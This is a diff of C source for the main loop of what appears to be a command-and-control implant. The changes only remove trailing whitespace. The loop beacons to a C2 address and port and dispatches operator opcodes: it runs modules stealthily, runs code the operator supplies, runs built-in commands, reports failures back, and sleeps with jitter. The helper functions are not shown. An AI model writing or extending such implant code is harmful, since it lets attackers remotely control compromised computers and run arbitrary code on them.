@@ -78,7 +78,7 @@ void main()
     // callback to the c2 and check if theres a commands to run, if so check what it is and run it. If the command then fails to run, report this back to the c2.
 
     while (TRUE)
-    {   
+    {
 
         Buffer = BeaconCallbackC2(_C2_CALLBACK_ADDRESS, _C2_CALLBACK_PORT, _CALLBACK_USER_AGENT, &OpCode, NULL, NULL, NULL);
 
@@ -88,7 +88,7 @@ void main()
             // no task, just sleep an check in later
             Success = TRUE;
             break;
-        
+
         case 0x2000:
             // execute module, this is much stealthier
             Success = ExecuteCode(Buffer, TRUE);
@@ -97,11 +97,11 @@ void main()
         case 0x3000:
             // execute code provided from the user, execution method is diffrent
             // because the users will want output from there code. Also the module
-            // code execution technique wont work so well will variable code 
+            // code execution technique wont work so well will variable code
             // provided by a user.
             Success = ExecuteCode(Buffer, FALSE);
             break;
-        
+
         case 0x4000:
             // stdlib command so lets run it
             Success = Stdlib(Buffer);
@@ -115,7 +115,7 @@ void main()
 
         Sleep(_CALLBACK_JITTER);
     }
-    
+
     // really should not hit this, so if it does lets just die
     DieCleanly();
 }
